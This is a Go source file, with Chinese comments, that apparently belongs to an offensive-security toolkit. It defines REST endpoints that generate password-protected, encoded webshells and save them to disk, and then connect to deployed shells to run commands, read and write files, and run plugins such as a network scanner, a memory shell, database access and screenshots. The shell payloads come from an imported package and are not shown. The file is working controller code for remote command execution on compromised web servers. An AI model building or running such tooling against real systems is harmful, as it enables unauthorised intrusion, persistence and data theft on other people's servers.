package server

// webshell_api.go — Webshell 控制台 REST（UI 直连版，复用 webshell 包）：
//   POST /api/tools/webshell/generate  生成服务端 shell（返回代码，文件落 data/evidence/webshell/）
//   POST /api/tools/webshell/exec      对已部署 shell 执行操作（test/exec/list/read/write）
// 与 agent 工具 webshell_gen/webshell_exec 同一内核，这里给工具箱 UI 用。

import (
	"encoding/base64"
	"encoding/json"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/Autumn-27/artex/webshell"
)

// POST /api/tools/webshell/generate {script_type, encoder, password, filename?}
func (s *Server) webshellGenerateAPI(w http.ResponseWriter, r *http.Request) {
	var b struct {
		ScriptType string `json:"script_type"`
		Encoder    string `json:"encoder"`
		Password   string `json:"password"`
		Filename   string `json:"filename"`
		GateHeader string `json:"gate_header"`
		GateValue  string `json:"gate_value"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		writeErr(w, 400, "bad json: "+err.Error())
		return
	}
	if strings.TrimSpace(b.Password) == "" {
		writeErr(w, 400, "password 必填")
		return
	}
	if b.Encoder == "" {
		b.Encoder = "raw"
	}
	code, err := webshell.GenerateShellOpts(b.ScriptType, b.Encoder, b.Password, webshell.GateOpts{
		Header: b.GateHeader, Value: b.GateValue,
	})
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	name := b.Filename
	if strings.TrimSpace(name) == "" {
		name = "shell." + webshell.FileExt(b.ScriptType)
	}
	name = filepath.Base(name)
	dir := filepath.Join(s.m.dir, "evidence", "webshell")
	_ = os.MkdirAll(dir, 0o755)
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(code), 0o600); err != nil {
		writeErr(w, 500, "写文件失败: "+err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"data": map[string]any{
		"path": p, "filename": name, "code": code, "size": len(code),
		"script_type": b.ScriptType, "encoder": b.Encoder,
	}})
}

// POST /api/tools/webshell/exec — 连接已部署 shell 执行操作。
func (s *Server) webshellExecAPI(w http.ResponseWriter, r *http.Request) {
	var b struct {
		URL        string `json:"url"`
		Password   string `json:"password"`
		Encoder    string `json:"encoder"`
		ScriptType string `json:"script_type"`
		Op         string `json:"op"`
		Cmd        string `json:"cmd"`
		Path       string `json:"path"`
		Content    string `json:"content"`
		ContentB64 string `json:"content_b64"`
		Cwd        string `json:"cwd"`
		Timeout    int    `json:"timeout"`
		Headers    string `json:"headers"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		writeErr(w, 400, "bad json: "+err.Error())
		return
	}
	if strings.TrimSpace(b.URL) == "" || strings.TrimSpace(b.Password) == "" {
		writeErr(w, 400, "url 与 password 必填")
		return
	}
	if b.Encoder == "" {
		b.Encoder = "raw"
	}
	if b.ScriptType == "" {
		b.ScriptType = "php"
	}
	if b.Op == "" {
		b.Op = "exec"
	}
	if b.Timeout <= 0 || b.Timeout > 120 {
		b.Timeout = 30
	}
	cli := &webshell.Client{
		URL: b.URL, Password: b.Password, Encoder: b.Encoder, ScriptType: b.ScriptType,
		Cwd: b.Cwd, Timeout: time.Duration(b.Timeout) * time.Second,
	}
	if b.Headers != "" {
		var hs map[string]string
		if json.Unmarshal([]byte(b.Headers), &hs) == nil {
			cli.ExtraHeaders = hs
		}
	}
	res, err := cli.RoundTrip(b.Op, webshell.P{
		Cmd: b.Cmd, Cwd: b.Cwd, Path: b.Path, Content: b.Content, B64Data: b.ContentB64,
	})
	if err != nil {
		writeErr(w, 502, "webshell 调用失败: "+err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"data": map[string]any{
		"ok": res.OK, "output": res.Output, "cwd": res.CWD, "error": res.Error,
		"data_len": len(res.Data), "data_b64": base64Encode(res.Data),
	}})
}

// POST /api/tools/webshell/ext — 插件操作（db/netscan/proc/zip/memshell/servlet/jar/screenshot/php工具）。
func (s *Server) webshellExtAPI(w http.ResponseWriter, r *http.Request) {
	var b struct {
		URL        string `json:"url"`
		Password   string `json:"password"`
		Encoder    string `json:"encoder"`
		ScriptType string `json:"script_type"`
		Op         string `json:"op"`
		Headers    string `json:"headers"`
		Timeout    int    `json:"timeout"`
		Ext        webshell.ExtParams
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		writeErr(w, 400, "bad json: "+err.Error())
		return
	}
	if strings.TrimSpace(b.URL) == "" || strings.TrimSpace(b.Password) == "" {
		writeErr(w, 400, "url 与 password 必填")
		return
	}
	if b.Timeout <= 0 || b.Timeout > 180 {
		b.Timeout = 60
	}
	cli := &webshell.Client{
		URL: b.URL, Password: b.Password, Encoder: b.Encoder, ScriptType: b.ScriptType,
		Timeout: time.Duration(b.Timeout) * time.Second,
	}
	if b.Headers != "" {
		var hs map[string]string
		if json.Unmarshal([]byte(b.Headers), &hs) == nil {
			cli.ExtraHeaders = hs
		}
	}
	res, err := cli.RoundTripExt(b.Op, b.Ext)
	if err != nil {
		writeErr(w, 502, "插件执行失败: "+err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"data": map[string]any{
		"ok": res.OK, "output": res.Output, "error": res.Error,
		"data_len": len(res.Data), "data_b64": base64Encode(res.Data),
	}})
}

func base64Encode(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	return base64.StdEncoding.EncodeToString(b)
}
